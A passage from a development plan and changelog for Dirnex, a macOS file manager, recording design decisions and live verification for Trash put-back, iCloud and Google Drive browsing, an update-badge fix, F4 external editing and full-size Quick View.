  the trash's *own volume* and is spelled two ways (leading slash on a volume trash, none in
  `~/.Trash`, and behind `System/Volumes/Data/` when Finder did the trashing). And `ptbN` is not the
  name in the trash: a collision renamed `alpha.txt` to `alpha.txt 13-12-35-977.txt`, and only the
  record knows what it was called.
- **The fixture is real bytes.** A 20 MB scratch volume, four items trashed into it by the system, its
  `.DS_Store` copied whole into the test bundle — including the collision. A fixture the tests
  *construct* would only prove the reader agrees with the tests.
- **Never overwrite; recreate; never abandon the rest.** The destination is stat'ed first, because
  `rename(2)` under `moveItem` would silently replace a file recreated at the original path since —
  destroying a newer copy to restore an older one. A folder deleted after the trashing is rebuilt
  (`mkdir` chain, then one retry) rather than making the item unrestorable. An item with no record is
  collected and named, like Empty Trash's failures.
- `Put Back` is a catalog command (File menu, palette, context menu), enabled only in a Trash listing;
  **Restore All** sits beside Empty Trash in the background menu, asks with a count, and skips hidden
  entries — restoring a `.DS_Store` would move the very database the rest of the restore reads.

Live verification, on a real mounted scratch volume plus the home trash: put-back returned a file to
the volume root; a **decoy** at the original path produced "already back" with the decoy untouched and
the item still in the Trash; deleting the origin folder entirely and retrying **recreated** it and
restored the file under its *original* name (proving `ptbN`); a folder came back with its contents;
and both home-trash items — one trashed by the API, one by Finder, i.e. both recorded path forms —
returned to the same real folder. Restore All's sheet counted the listing exactly; Put Back greys out
in an ordinary directory.

### M9 — iCloud Drive, for real (M)

M8's iCloud row browses the on-disk `com~apple~CloudDocs` container faithfully — the loose files a
user drops in iCloud Drive (Car, Downloads). But Finder's "iCloud Drive" is a *synthesized* surface,
and the gap is visible the moment the two sit side by side: Finder merges that container with every
iCloud-enabled app's **own** document container, and it presents dataless placeholders that download
on open. M9 makes Dirnex's row the real thing. (Probed 2026-07-21: the app containers
— `com~apple~Preview`, `com~apple~Pages`, `com~apple~Numbers`, `com~apple~TextEdit`,
`iCloud~is~workflow~my~workflows`, third-party `iCloud~*` — live as **siblings** under
`~/Library/Mobile Documents/`, not inside CloudDocs; their `Documents/` subfolders read back
`Operation not permitted` without Full Disk Access, while CloudDocs itself is TCC-carved-out and reads
free.)

- [x] **Dataless placeholder awareness** — *core landed 2026-07-21.* The premise above was wrong and
      the probe caught it: there is **no `.<name>.icloud` stub** on this macOS. `brctl evict` leaves
      the file under its real name with its real `st_size`, `st_blocks == 0` and `SF_DATALESS` set —
      the `.icloud` stub is the pre-Catalina/iOS shape. So name and size were already right, and the
      slice is `FileEntry.isDataless`, read for free out of the `stat` the listing already does. The
      hazard the plan missed is the other direction: a transparent read *materializes* (measured
      1.1 s for 200 KB of blocked thread), so the recursive sizer, content search and byte-compare
      must consult the flag before opening anything or they silently pull the whole drive down.
      *App pass landed 2026-07-21: the badge is the M6 cloud badge, with `isDataless` as its second
      source — the attribute scan can lag the flag, and in the merged listing it does not run at all
      (it gates on a real cloud directory, and that pane's directory is synthetic). Consulted after
      the snapshot, so a download in flight still paints as downloading rather than as evicted.*
- [x] **Download on open** — opening or previewing an evicted item fires
      `FileManager.startDownloadingUbiquitousItem(at:)` and waits on the status key rather than handing
      a byte-less stub to the viewer. Pure progress state machine in the core (evicted → downloading →
      ready), the syscall and the wait in the app. *Core landed 2026-07-21 (`CloudDownloadTracker`);
      app pass the same day (`CloudDownloadPrompt`), verified live on a `brctl evict`-ed 290 KB PDF:
      sheet, download, open in Preview, `SF_DATALESS` cleared, badge gone. Three calls worth knowing:
      the sheet waits 400 ms before appearing, so a fast fetch never flashes a modal; the bar is
      **indeterminate** because macOS exposes no per-item percentage through the URL resource keys
      (`NSMetadataQuery` has one — `CloudDownloadTracker.observe(percentDownloaded:)` is ready for it,
      and it is deliberately not wired for a single-item wait); and a `.serverUnavailable` provider
      error is ignored rather than treated as failure, since it rides along with healthy transfers.*
- [x] **The merged app-container view** — the piece that makes the row match Finder. Union the sibling
      `~/Library/Mobile Documents/<container>/Documents` folders into the iCloud listing. Needs Full
      Disk Access (those `Documents/` are TCC-gated — probed) wired into the **M7 FDA flow**.
      *VFS shape decided 2026-07-21: a **virtual merged listing**, exactly the M8 Trash's shape — a
      results tab whose entries carry real on-disk paths, so stepping into "Pages" lands in an
      ordinary local folder and no operation needs a synthetic path space. Core landed
      (`ICloudDrive`); app pass the same day. Three places it deliberately behaves **unlike** the
      Trash, because iCloud Drive is a place people browse and put things in rather than a bin:
      the sidebar row **navigates in place** instead of opening a tab per click; the root is
      **writable** — New Folder, paste and drop resolve through `PanelViewController.writeDirectory`
      to the CloudDocs container underneath, and `canWriteHere` asks the same question so nothing
      lights up over a flow that would bail; and stepping into a library navigates *this* pane, with
      **up** (`ICloudDrive.isMergedRoot`) returning to the merge rather than to the one-child
      container folder underneath. The FDA degrade is silent by default — the listing is simply the
      loose files — with a **one-shot** offer of the grant (`presentForICloud`, its own latch)
      explaining what is missing, since a short iCloud Drive is otherwise a quiet wrong answer.*
      *Both merges also became **live** in the same pass: a merged listing had no watcher at all, so
      a file trashed in Finder didn't appear in an open Trash tab until the row was clicked again.
      `DirectoryWatcher` now takes an array — one FSEvents stream over whatever the gather actually
      read (`PanelTab.mergedSources`) — and a merged tab re-gathers on activation, because the
      pane's one watcher follows the active tab and cannot see what happened while it was away.
      This closes the last gap M9 opened in M8's Trash, alongside the iCloud trash above.*
- [x] **App-name / icon resolution** — *core landed 2026-07-21.* Probed rather than guessed, and both
      guesses in the bullet above were wrong: the mapping is not in the container, and
      `NSWorkspace.icon(forFile:)` returns the **generic folder icon** for these. Both live in
      `~/Library/Application Support/CloudDocs/session/containers/` — `<bundle-id>.plist` carries
      `BRContainerName`, `BRContainerLocalizedNames` and `BRContainerIsDocumentScopePublic`, and the
      sibling `<bundle-id>/` directory caches the icon PNGs. The cache beats LaunchServices because
      half these apps are iOS-only and not installed on this Mac.

Exit: the iCloud row shows what Finder's shows — loose files *and* the per-app document folders; an
evicted file downloads on open instead of opening empty; and a machine without FDA degrades to the
loose-files view M8 already ships, rather than an error.

**One deviation, decided 2026-07-21: "what Finder's shows" is matched approximately, on purpose.**
Which app containers Finder lists is not derivable from anything public. This Mac declares 17
containers `BRContainerIsDocumentScopePublic` and Finder shows 7 of them, and nothing separates the
two sets — not directory mtimes, not emptiness, not whether the app is installed, not `bird`'s own
`client.db` (`app_libraries`, per-zone item counts). Dirnex's rule is **public scope, and the folder
is not empty** (`.DS_Store` not counting, the same reason the M8 Empty Trash confirmation ignores it).
Verified live against the screenshotted Finder listing: that yields Curve, Pages, Preview, Shortcuts —
Finder's set minus TextEdit, Amadine and Numbers, all three of which are *empty folders*. Missing an
empty folder is a smaller lie than showing the ten empty app folders Finder deliberately hides.


### The update indicator that could never light (2026-07-21, VERIFIED LIVE)

A defect in shipped M7, reported from the outside: `0.0.5-beta.1` had been published two days
earlier, the installed app was `0.0.4` (build 3), "receive beta updates" was on — and the titlebar
carried no badge.

**Everything the feature owns was correct.** The appcast had the beta item at `sparkle:version` 4
on `<sparkle:channel>beta</sparkle:channel>`, above the installed build 3;
`Dirnex.pref.receiveBetaUpdates` was `1`, so `allowedChannels(for:)` would have returned `["beta"]`;
`UpdateAvailability` and the indicator button were doing exactly what they were written to do. The
answer was one line of the *installed app's* defaults:

```
SUEnableAutomaticChecks = 0
```

Sparkle's first-run permission prompt had been answered "no" once, months of releases ago. It never
asks again. With automatic checks off no scheduled check runs, so `didFindValidUpdate` had never
fired since launch, and `availability` — whose only writers are those callbacks — had never left
`.none`. An indicator faithfully rendering state that nothing updates.

Reading the installed binary's defaults rather than reasoning about the code is what found it in one
step; it is now the first move in NOTES.md when an update fails to surface.

**The fix: stop depending on Sparkle's scheduler.** Turning `SUEnableAutomaticChecks` back on was
rejected — it overrides a user's explicit answer, and Sparkle's scheduled check raises its full
update dialog on its own, which is a window the user did not ask for. `SPUUpdater` has exactly the
right tool instead: `checkForUpdateInformation()`, the *probing* check. It fetches the real appcast
through the same delegate — so the beta opt-in still applies — and presents no UI at all; all it does
is drive `didFindValidUpdate` / `updaterDidNotFindUpdate`, which is precisely what the indicator
reads. Clicking the badge still opens Sparkle's normal install flow. So: a silent probe at launch and
every 8 hours lights the badge, and the only window that ever appears is one the user opened.

Core: `UpdateCheckSchedule` (`isDue(lastCheck:now:)`, `delayUntilNextCheck(lastCheck:now:)`), 8 tests.
The arithmetic is the part that can be wrong in the quiet direction — a `lastCheck` in the future
from clock skew must count as *due* rather than hold the schedule shut for the length of the skew,
and the delay must clamp into `0...interval` so an overdue probe cannot ask a `Timer` for a negative
interval. App: `AppUpdater.startProbing()` and a one-shot `Timer` in `.common` mode that re-derives
its own successor, plus a `didBecomeActive` catch-up — a timer does not fire while the machine is
asleep, so a laptop opened after a night comes back with an armed timer that is hours overdue and
still waiting. The last-probe date is deliberately **not** persisted: the launch probe is
unconditional, so nothing outside the process ever reads it.

Verified live: a Debug build (`CFBundleVersion` 1) launched from a shell with
`SUEnableAutomaticChecks` still `0` raised the accented badge with no dialog anywhere on screen, and
its tooltip read *"Dirnex 0.0.5-beta.1 is available — click to install"* — the beta item, so the
channel opt-in survived the probing path. `SULastCheckTime` moved to the launch minute while
`SUEnableAutomaticChecks` stayed `0`, which is the shape of the fix: the user's answer untouched, the
badge honest anyway.


### M10 — Google Drive and Docs (L)

Reaching the user's Google Docs. Phased along the two depths that actually exist, cheap first
(decided 2026-07-21). Phase 1 shipped; Phase 2 was **cut** rather than deferred — argued at the
bottom of this entry.

**Phase 1 — the Desktop mount (no API, no OAuth).**

- [x] **Browse the Google Drive for Desktop mount** — landed 2026-07-21, and **generalized to every
      provider** rather than matching `GoogleDrive-*`: the scan reads `~/Library/CloudStorage` and
      takes whatever is mounted there (`<Provider>-<account>`), so Dropbox, OneDrive and Box come
      free at no extra code. `CloudStorageMounts` (core, 18 tests) discovers and names them; the
      sidebar's **iCloud section is now "Cloud"** and holds iCloud Drive plus a row per mount, each
      browsed by the existing `LocalBackend` — no new backend. The section keeps its `icloud` case
      so persisted collapse state survives the rename.

      Two things worth carrying forward, both in NOTES.md: `~/Library/CloudStorage` lists **without**
      FDA (unlike `~/Library/Mobile Documents`), and a signed-in Drive account can mount **empty** —
      probed here, `fileproviderctl dump` said `child:3` while DriveFS's own metadata db held 83
      items, because the account's roots were never provisioned. An empty mount is a legitimate
      state, so nothing filters on content.

      Refined the same day, once a reconnected account made the mount real:
      - **A row opens the mount's single visible child** (`My Drive`) rather than the mount root, so a
        click reaches the files instead of one folder to step through. "Exactly one visible child" is
        the condition under which descending hides nothing — an account with Shared drives has two and
        opens at the root; Dropbox-style providers have many and stay put.
      - **The path bar roots its trail at the mount**, behind the same `cloud` glyph the sidebar row
        carries: `☁ Google Drive › My Drive › Job`, not six crumbs of
        `Macintosh HD › Users › oleg › Library › CloudStorage › GoogleDrive-…`. Every crumb is a
        real directory, so the trail stays fully clickable. The glyph is the one
        `installVirtualLabel` already put in front of the Trash, factored out so both spellings of
        "what kind of place is this" share it.
      - **iCloud Drive got the same treatment** (`ICloudLocation`, core, 14 tests), because the
        complaint was identical one level over: a folder opened from the merged listing is a real
        local directory whose real path runs through container machinery — the "Pages" row's folder
        is `~/Library/Mobile Documents/com~apple~Pages/Documents`. It now reads
        `☁ iCloud Drive › Pages › Drafts`, and the **root crumb is clickable**, re-gathering the
        merge exactly as walking up out of one of its rows does (with the cursor landing on the row
        the pane came out of). That retires the dead-end label the merge used to get — it earned one
        as a *results* listing and never behaved like one. Two details:
        - **The merged root is now editable too** (double-click, Cmd+L), based at the CloudDocs
          container its writes already resolve to (`writeDirectory`), rather than being the one stop
          on the way in and out of iCloud Drive where the path goes dead.
        - **Every public container is a row now, empty or not** — decided 2026-07-21 after the
          path-bar work put the merge side by side with Finder's. The old rule also demanded a
          non-empty `Documents`, and **three of the seven folders Finder shows here are empty**
          (Amadine, Numbers, TextEdit), so they were missing. Between two wrong sets, showing a
          folder Finder hides is recoverable and hiding one the user can see in Finder is not — it
          reads as Dirnex having lost them. The ten Finder hides (GarageBand, iMovie, Keynote,
          QuickTime Player, Automator, Script Editor…) come along, which is the accepted cost.
          Probed against the real machine with a throwaway harness on the real core: 17 rows, the
          seven Finder shows among them.
        - **The app name has a second source.** The cached plist `ICloudDrive.appLibraries()` reads
          is refused without Full Disk Access *while the container itself still lists* — observed
          live, where the crumb came out as `com.apple.Pages`. So the OS's own
          `URLResourceValues.localizedName` is injected as a fallback: non-hermetic, hence in the
          app, hence a closure the core is handed rather than one it calls (§2).
      - **The section refreshes live when an account is connected or signed out.** A File Provider
        mount is not a volume and posts no `NSWorkspace` notification, so this is an FSEvents watcher
        on `~/Library/CloudStorage` — the parent, never the mounts, which would wake on every synced
        file.
- [x] **Open `.gdoc` / `.gsheet` / `.gslides` stubs** — landed 2026-07-21. A Google-native doc on the
      mount is a tiny JSON file, not bytes. `GoogleDocStub` (core, 16 tests) parses it and builds the
      editor URL; `GoogleDocLauncher` (app) opens it, the same core-decides-where / app-performs-the-
      launch split M4 uses for external tools. Real (non-native) Drive files are dataless File-Provider
      items — the same download-on-open story as M9's iCloud, so the stub read sits *inside* the
      existing `CloudDownloadPrompt.materialize` wrapper rather than beside it: a stub can itself be
      unmaterialized, and there is nothing to parse until it is here.

      Three decisions the shape rests on:
      - **The kind comes from the extension, because the payload cannot say.** The JSON is byte-for-byte
        the same shape for a Doc and a Sheet, so `.gdoc` → `document`, `.gsheet` → `spreadsheets`,
        `.gslides` → `presentation` (plus `.gdraw`, `.gform`) is the only signal. The five that live
        under `docs.google.com/<segment>/d/<id>` are handled and no more: `.gmap`, `.gscript` and
        friends sit on other hosts with other shapes, and an unhandled suffix falls back to the
        ordinary open — a working outcome, where a guessed URL is a broken one.
      - **A failed parse falls through to the default app, it does not raise.** A `.gdoc` whose bytes
        are not a stub is a real file the user should get to see, so `nil` means "not mine".
      - **`doc_id` is charset-guarded before it reaches a URL.** The value comes out of a *file's
        contents* and decides where the app then navigates, so an unconstrained one would let a
        hostile file choose the host. Real identifiers are `[A-Za-z0-9_-]`; anything else is refused.

      Verified live end to end: 44/44 real stubs across both accounts parse (throwaway harness on the
      real core), and double-clicking one in the pane opened that exact document in Chrome. The one
      thing the live pass could **not** settle: a doc belonging to an account the browser is not signed
      into lands on Google's "You need access" page. `?authuser=<email>` from the stub is carried for
      that reason and is proven harmless (the successful open accepted it and rewrote to `?tab=t.0`),
      but this Mac's Chrome profile holds only one of the two accounts, so it is unproven as a *fix*.

      **Unblocked and re-specified 2026-07-21**, once the mount held real content. This bullet used to
      say the stub "holds a `docs.google.com` URL" — **it does not**, and building against that would
      have failed at the first file. The real bytes are
      `{"":"WARNING! …","doc_id":"…","resource_key":"","email":"…"}`, so the URL has to be
      *constructed* from `doc_id` and the extension. Exactly the failure mode §2's probe-first rule
      exists to catch; NOTES.md carries the format.
- [x] **The mount's trash, and its sync badges** — landed 2026-07-22, both from the same report: a file
      deleted from Google Drive sat in Finder's Trash and not in Dirnex's. Every `~/Library/CloudStorage`
      mount carries **its own trash**, `<mount>/.Trash`, one per account and the same shape as the
      iCloud one M9 found a day earlier — which is the lesson: "how many trashes are there" is answered
      per *file provider*, not once. It needs no FDA, it must sit exactly one level below the
      CloudStorage root (a `.Trash` deeper inside someone's Drive is ordinary content, and reading it
      as a trash would turn F8 there into a permanent delete), and Put Back cannot work there for the
      same reason it cannot in iCloud's — the origin is an opaque provider reference with no path in
      it. Sync **status** then turned out to need no Drive-specific code at all: a *streaming* mount is
      a real File Provider domain, so every row answers the standard `ubiquitousItem*` keys and carries
      `SF_DATALESS`, and `CloudItemAttributes.status` classified it unchanged — Drive even reproduces
      iCloud's `isDownloading`-while-`NotDownloaded` quirk, which the reordered precedence already
      handled. Verified with one mount of each kind side by side.

Exit: a Google Drive row browses the Desktop mount, a Google Doc opens in the browser, deletes land in
a trash Dirnex can show, and synced files badge themselves. ✅ met.

**One deliberate cut, decided 2026-07-22: there is no Drive API backend, and Phase 2 is dropped, not
deferred.** The plan had a second phase — a `GoogleDriveBackend` (OAuth2 loopback/PKCE, refresh token
in the Keychain, Drive API v3 mirroring the M5 SFTP split), plus `files.export` for native Docs, for
accounts *not* synced to this Mac. Three reasons it went away:

- **It buys a second, worse path to the same files.** Any Drive account the user actually works in is
  mounted by Drive for Desktop, and Phase 1 browses that through `LocalBackend` — with the OS doing
  the syncing, the caching and the conflict handling. An API backend would re-implement all of it over
  HTTP and be slower and less correct at it.
- **The price was never code.** Browsing a whole Drive needs the *restricted* `drive` /
  `drive.readonly` scope, which Google grants only behind restricted-scope verification **plus a paid
  annual CASA security assessment**; the unrestricted `drive.file` scope skips that and cannot list a
  pre-existing Drive, so it is useless for a file manager. That is a recurring money-and-compliance
  commitment attached to a feature whose users already have the mount.
- **It contradicts a standing non-goal.** PLAN.md §1 has said since day one: cloud folders work as
  folders, no proprietary APIs. Phase 1 honored that and got Dropbox, OneDrive and Box for free by
  reading the mount directory instead of any vendor's API. Phase 2 was the one place the plan argued
  against itself.

Native Docs export/import goes with it: `files.export` is an API call, and a user who wants a `.docx`
has File → Download in the editor the stub already opens. The open question this gated —
which OAuth scope to buy — is closed by not asking it.


### M11 — F4 Edit, and Quick View at full size (S)

Two independent slices, neither of which needs the other: F4 binds the last free key on the
Total Commander row, and ⌃Q's preview grows two larger sizes. Both are app-side by
construction — one hands a file to another app, the other is AppKit geometry — so the core's
share of this milestone is a handful of catalog entries.

**Slice 1 — F4 Edit.**

The last unbound key on the Total Commander row. F4 has been deliberately free since M6
(`FunctionBar.slot(forFunctionKey:)` names it as the example of an unmapped key) because
Dirnex has no edit command; this gives it one **without writing a text editor**. A real
editor is encoding detection, line-ending preservation, a binary gate, undo grouping and
find/replace — a whole app, and every Mac already has one the user has already chosen. So
F4 hands the file over, exactly the way ⌥F3 hands two files to FileMerge. Same split as
M5's compare-by-content: a pure tested descriptor in the core, a thin launcher in the app,
a Settings picker between them.

- [x] **`ExternalTextEditor` (core)** — the descriptor and the resolution order, mirroring
      `ExternalDiffTool`: BBEdit, VS Code, Sublime Text, Zed, Nova, TextMate, CotEditor,
      Xcode, TextEdit. One deliberate deviation — resolve by **bundle identifier through an
      injected probe, not by CLI executable path**. `ExternalDiffTool` looks for `bbdiff` /
      `opendiff` because a diff tool *is* invoked as a command; an editor's shim (`code`,
      `subl`) is an optional install most users never perform, so probing for it would report
      "VS Code isn't installed" to someone staring at its icon in the Dock. `OpenWithLauncher`
      already opens by bundle URL and is the model. **Automatic** = the system's own default
      handler for plain text, so a user who never opens Settings gets what double-clicking a
      `.txt` already gives them.
- [x] **F4 opens the file under the cursor** — directly, no dialog (decided 2026-07-22; TC's
      own split). Cursor item only, marks ignored: this is "edit the thing I'm pointing at",
      and a dozen editor windows is not what a marked set means. A directory under the cursor
      is not editable, so F4 there is inert — no error, the same way ⌥F3 declines a folder.
- [x] **⇧F4 opens the name dialog** — prefilled with the cursor's file name and selected, so
      Enter is "edit this" and typing over it is "make a new one". Existing name → open it;
      new name → create the empty file, then open it. F4 with nothing editable under the
      cursor (the `..` row, an empty directory) falls through to this dialog rather than doing
      nothing, which is where TC's Shift+F4 and plain F4 usefully converge.
- [x] **Gate the create path on a real directory, not on `.write`** — `writeDirectory`, the
      guard `promptForNewFolder` already uses. NOTES.md's standing trap: the merged Trash
      carries `.write` so `deleteStrategy` resolves to `.permanent`, and that alone lit up New
      Folder and Paste inside a Trash tab. ⇧F4 must not become the third. Reuse New Folder's
      shape wholesale — `NSAlert` + accessory field, `/` refused with a real message, then
      `refreshCurrentDirectory(selecting:)` so the new file lands under the cursor.
- [x] **Local files only** — `.local` backend filter, the same one Open With, Quick Look and
      Compare all apply. An archive member or an SFTP file would edit an extracted temp copy
      whose saves go nowhere (already noted at `PanelViewController+NestedArchive`), and a
      silent no-op that looks like it worked is the expensive kind of wrong.
- [x] **Route through `CloudDownload`, never `String(contentsOf:)`** — an evicted iCloud or
      streaming-Drive file is `SF_DATALESS`, and touching one byte blocks while it materializes
      (measured 1.1 s for 200 KB). The listing already carries `isDataless`; F4 reads it and
      shows the existing download prompt instead of beachballing.
- [x] **Absorb the fallout of binding F4** — it joins `FunctionBar.defaultSlots` as "Edit" and
      therefore leaves `assignableFunctionKeys`, whose stock answer becomes F1, F9, F10, F12.
      A user script already bound to F4 keeps its button and **silently stops firing from the
      key**, because a bar slot is dispatched before the pane's handler ever sees the press.
      Detect that collision on load and say so, rather than letting it degrade quietly. Two
      `FunctionBarTests` assertions pin today's state and are part of the change, not
      casualties of it: "F4 is deliberately unbound", and `assignableKeys`' exact
      `[1, 4, 9, 10, 12]`. `CommandCatalog`'s ⌥F3 comment ("stock leaves F3/F4 unbound") goes
      stale in the same move — ⌥F3 itself is unaffected, since a bare key and a modified one
      are different key-equivalents.

Exit: F4 on a text file opens it in the user's editor; ⇧F4 names a new one into existence and
opens that; the editor is switchable in Settings and defaults to something sane with no visit
there. Explicitly **not** in scope: a built-in editor (argued above — revisit only if leaving
the app proves to break the keyboard-first flow, which is a claim to test by living with this
first), and write-back for archive/SFTP files (edit-temp-watch-repack is its own slice).

**Landed 2026-07-22.** Verified live: F4 opened `notes.txt` in TextEdit; ⇧F4 created `fresh.md`,
landed the cursor on it and opened it; ⇧F4 + Enter over the prefilled name reopened the existing
file with its contents intact. Four decisions the checklist didn't pre-answer:

- **`createFile(at:)` is a new `VFSBackend` primitive**, `O_EXCL` in `LocalBackend` and
  `.unsupported` by default. Creating an empty file touches bytes, so §2 puts it in the core with
  tests; `O_EXCL` is what makes ⇧F4 safe on a name the user typed — the stat-then-create race
  would otherwise truncate a document on the way to opening it.
- **"Inert on a folder" is a *greyed* menu item, not a swallowed keystroke.** The first cut left
  F4 enabled with a folder under the cursor and doing nothing — caught in the built app, not by a
  test. Enabled now means exactly "the key does something": a local file, or nothing under the
  cursor at all (where F4 becomes ⇧F4's dialog).
- **The menu items name the editor** — "Edit with TextEdit" — the way Compare By Contents names
  its tool. Measured first: the plain-text handler costs ~20 µs and a bundle lookup ~2 µs warm, so
  the resolution runs live on every validation with no cache to go stale.
- **⇧F4's create is deliberately not undoable**, unlike New Folder's. The file is handed to an
  external editor in the same breath, so ⌘Z would delete something another app has open.
- **The name field always starts out holding something**, selected: the cursor's own name
  *whatever it is* — a folder's included, since ⇧F4 beside a folder is usually "something like
  that, but a file" — and, where there is no cursor at all (`..`, an empty directory), the pane's
  own folder name. An empty field asks the user to type from nothing; a selected one is a
  starting point either way. The dialog does **not** name the folder in its text (2026-07-22):
  the path bar right above it already does, and the prefill is drawn from it.

`LocalBackend` was split (`LocalBackend+Copy.swift`) to stay under `type_body_length`.

**Slice 2 — Quick View at full size.**

⌃Q's preview (§M4) occupies the inactive pane, which is the right size for glancing and the
wrong one for reading a contract or looking at a photograph. This gives it two larger sizes
without giving it a second implementation: the existing overlay already *covers* the file
list rather than hiding it, so the active pane's table keeps first responder and the cursor
keeps driving the preview at any size. Every behaviour the panel has — cursor tracking, Tab
to swap which pane is the source, on-demand archive-member extraction, the `PDFView` route
for multi-page PDFs, Esc — transfers for free because none of it knows how big the preview is.

Two sizes rather than one because they are different activities. **Full window** is a working
mode: the document spans both panes while the sidebar, terminal drawer and function bar stay
where they were, and you are still in the file manager. **Full screen** is a viewing mode:
the native full-screen space, black backing, nothing on screen but the photo.

- [x] **`QuickViewPreviewView` — extract before extending.** The overlay and its two backends
      (the `NSBox` backing, the lazy `QLPreviewView(.compact)`, the lazy `PDFView`, the
      content-type routing between them) come out of `PanelViewController+QuickView` into a
      standalone view. The pane keeps one pinned over its scroll view; each new mode hosts an
      identical one at a different anchor. A pure refactor with no behaviour change, and the
      thing that keeps this slice from being three copies of one preview.
- [x] **A mode, not a Bool** — `isQuickViewOn` becomes
      `QuickViewMode { off, pane, fullWindow, fullScreen }` on the window controller, which
      already owns the state because the mode spans both panes. `isQuickViewEnabled` stays as
      `mode != .off`, so `fileTableCancel`'s progressive Esc and `validateMenuItem` need no
      rethink.
- [x] **Re-assert table focus after every show.** The new risk the pane version never had: in
      the full modes the preview sits over the *focused* table, so a backend that takes first
      responder turns ↑/↓ into document scrolling and the cursor stops moving — the mode's whole
      point, lost silently. `focusedPanel.focusTable()` after each show, and a subclass refusing
      first responder if that isn't enough. Verify live; first-responder questions are exactly
      what a screenshot cannot answer.
- [x] **⌃⇧Q full window, ⌃⌥Q full screen — flat toggles.** Each key turns its own mode off and
      switches from any other; Esc closes straight out to the file list from any of the three.
      Deliberately *not* an escalation ladder where repeat presses of ⌃⇧Q climb — that is a key
      that never turns off what it turned on.
- [x] **Full window anchors on `panesSplitViewController.view`** — both panes and the divider,
      and nothing else. The sidebar, the drawer and the function bar stay usable, which is what
      separates this mode from the next one rather than making it a smaller version of it.
- [x] **Full screen anchors on the window's `contentView` and enters the native space** —
      black backing instead of `textBackgroundColor`, no chrome. The fiddly part is state sync,
      not rendering: `toggleFullScreen(nil)` needs a *did we enter it* flag or closing the
      preview evicts a user who was already full-screen, and `willEnterFullScreen` /
      `willExitFullScreen` observers or leaving by ⌃⌘F or the green button leaves the mode
      claiming something untrue.
- [x] **A name-and-position header, in both full modes.** In pane mode the list sits beside the
      preview; in the full modes it does not, and arrowing through files you cannot see is
      flying blind. Pinned in full window (a working surface), fading in and back out on mouse
      movement in full screen (a viewing one).
- [x] **← / → step the cursor while a full mode is up.** Both keycodes fall straight through
      `FileTableView.handleTypingKey` today, so they are free — and nobody flips through a
      vacation folder with ↑/↓.
- [x] **A two-finger swipe does the same thing** (added 2026-07-22, on request): the same gesture
      Preview and Photos flip pages with, at the same two sizes and through the same cursor
      movement. The decision — how far is a swipe, which way, and the two ways it could run away —
      is a tested `SwipeStepper` in the core; the app only maps `NSEvent` onto it.
- [x] **Two catalog commands** — `view.quickViewFullWindow` (⌃⇧Q) and `view.quickViewFullScreen`
      (⌃⌥Q), with menu items beside Quick View Panel, `CommandBinding` selectors and
      `validateMenuItem` checkmarks. `KeyBindings().conflicts(for:)` is what proves both are
      free, and the catalog test is the only test this slice can carry — the rest is AppKit and
      is verified by driving the built app.

Exit: ⌃⇧Q reads a PDF across both panes with the sidebar still in place; ⌃⌥Q fills the display
with a photo and nothing else; arrows walk the file list underneath in both, and Esc returns to
it. Explicitly **not** in scope: a slideshow timer or a thumbnail filmstrip — that is an image
viewer, and the point here is that the *file list* remains the navigation.

**Landed 2026-07-22.** Verified live against the built app: ⌃⇧Q read a 7-page PDF across both
panes with the sidebar, drawer split and function bar untouched; ⌃⌥Q filled the display with a
photo on black; ←/→/↑/↓ walked the list underneath in both, re-driving the preview and the header
each step; the green button out of full screen closed the mode and restored the panes; ⌃Q's M4
pane preview is unchanged by the extraction. Four things the checklist didn't pre-answer, three
of them caught only by driving the real app:

- **The three commands live on `BrowserWindowController`, not on the pane** — the change the
  checklist got wrong. At the two full sizes the preview is a *sibling* of the panes, so one click
  into the document leaves no `PanelViewController` in the responder chain and every Quick View
  key goes silently dead. `view.terminal` already lives on the window for exactly this reason.
  ⌃Q moved with them: it is the same mode, and a mode is not a pane's to own.
- **`NSView.clipsToBounds` is `false` by default, and `draw(_:)`'s `dirtyRect` is not promised to
  be inside the view.** Filling it blacked out the sidebar and the function bar while the overlay's
  own frame was provably correct — the frame is what a screenshot shows, so the diagnosis came from
  a probe, not from looking. The `NSBox` the M4 overlay used had been clipping all along.
- **The header pins to the *safe area*, not the top edge**, or it draws its "2 of 7" straight
  through the Back/Forward chevrons in the transparent title bar.
- **A window posts no mouse-moved events by default**, so the fading full-screen header never
  appeared until `acceptsMouseMovedEvents` was set — the tracking area is not enough on its own.

The **two-finger swipe** landed the same day, on request. It rides the same scroll-event monitor
shape as Esc and for the same reason — `PDFView` and the out-of-process `QLPreviewView` are what
the pointer is over, and both eat scroll before it could bubble. Two guards are the whole design,
and both are in `SwipeStepperTests` rather than in a finger: **momentum is ignored**, or one flick's
coast walks the cursor through the entire folder after the fingers have left the glass; and a swipe
must be **mostly horizontal**, or scrolling a long document sideways-drifts through files. Vertical
scroll is handed straight back, so a PDF still scrolls exactly as it did. Two things it is worth
knowing were *not* verified here: a synthetic scroll event is not a trackpad
(`hasPreciseScrollingDeltas == false`, no phase), so the wiring was proven by temporarily dropping
that one gate — and `SwipeStepper.threshold` (120 pt, about a third of a trackpad, the distance
Preview asks for) is a number picked from what those apps feel like, not measured. It is the one
value here that wants a real hand.

**Rebuilt on the system's own gesture, 2026-07-22, after five rounds of hand-tuning failed to
converge.** The first version counted distance; the second was an interactive, commit-on-lift state
machine in the core (`SwipeStepper`). Both were wrong in the same way, and the measurements are the
record of it: 187 logged gestures showed travel a hand intends identically ranging over 82…611 pt,
so a threshold-per-row dealt 0–5 rows for the same flick; a later probe showed `scrollingDeltaX` is
**acceleration-scaled**, measured at 1.00× for a slow swipe against **5.18×** for a fast one over
the same glass, so any threshold expressed in it silently demands more distance the slower you move.
Every fix landed a new complaint — too long, too fast, too much effort, sticking, juddering.

The lesson is that none of those quantities were ours to own. `NSEvent.trackSwipeEvent` — the fluid
swipe tracking Safari and Preview turn pages with — answers all of them: how far is far enough, what
counts as horizontal, how to compensate for acceleration, when the user has changed their mind, and
how to animate the remaining travel after the fingers lift. The handler now decides *which file* and
nothing else, so the feel is the platform's and matches every other app on the machine. `SwipeStepper`
and its 23 tests were **deleted**: not because the tests were wrong, but because the thing they
pinned should never have been ours to decide. Dirnex honours
`NSEvent.isSwipeTrackingFromScrollEventsEnabled` rather than substituting its own gesture — a user
who has turned "Swipe between pages" off has said what they want, and ← / → still walk the list.

Two things had to change with it, both found live:

- **Images bypass Quick Look now.** `QLPreviewView` renders out of process, so translating the layer
  hosting it costs a round trip per frame — a visible judder ("like 30 fps") on exactly the content
  people swipe through. An in-process `NSImageView` sits beside the existing `PDFView` for that.
- **The covered panes stayed interactive under the preview**, which the divider was only the visible
